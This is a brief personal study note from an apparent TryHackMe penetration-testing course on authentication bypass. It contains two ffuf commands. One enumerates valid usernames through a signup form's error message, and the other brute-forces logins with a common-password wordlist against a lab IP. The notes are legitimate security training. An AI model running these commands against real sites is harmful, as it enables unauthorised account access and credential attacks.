# Today-I-Learnt

## TIL 05/06/2022

### Docker Network


### Linux Monitoring


### Tryhackme
#### Jnr Pentester 
##### Authentication Bypass
```bash
# Fuzzing a username
# Which ever field needs to be fuzzed should have a value set as 'FUZZ' 
# '-mr' is the flag used to slect what is the valid output we are looking for in the page
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" 

# Fuzzing password
# When we pass the file as values to the field we use '-w'
# -fc flag is used for status code we are looking for
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.228.119/customers/login -fc 200

```
